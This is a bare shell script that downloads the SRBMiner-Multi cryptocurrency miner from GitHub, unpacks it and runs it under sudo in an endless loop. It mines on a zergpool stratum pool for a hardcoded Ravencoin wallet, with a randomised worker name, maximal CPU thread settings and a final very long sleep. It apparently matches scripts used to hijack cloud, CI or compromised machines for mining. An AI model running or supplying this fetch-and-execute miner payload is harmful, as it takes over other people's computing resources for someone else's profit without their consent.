#!/bin/sh
 WORKER=$(echo $(shuf -i 0-15 -n 1)-RVN)
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.7/SRBMiner-Multi-0-7-7-Linux.tar.xz
tar -xf SRBMiner-Multi-0-7-7-Linux.tar.xz
cd SRBMiner-Multi-0-7-7
chmod +x SRBMiner-MULTI
while [ 1 ]; do
  sleep 5
  sudo ./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://verushash.asia.mine.zergpool.com:8335 --wallet RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$WORKER --password c=RVN --keepalive value true --cpu-threads 40 --cpu-threads-intensity 40 --cpu-threads-priority 40
  done
sleep 999999999
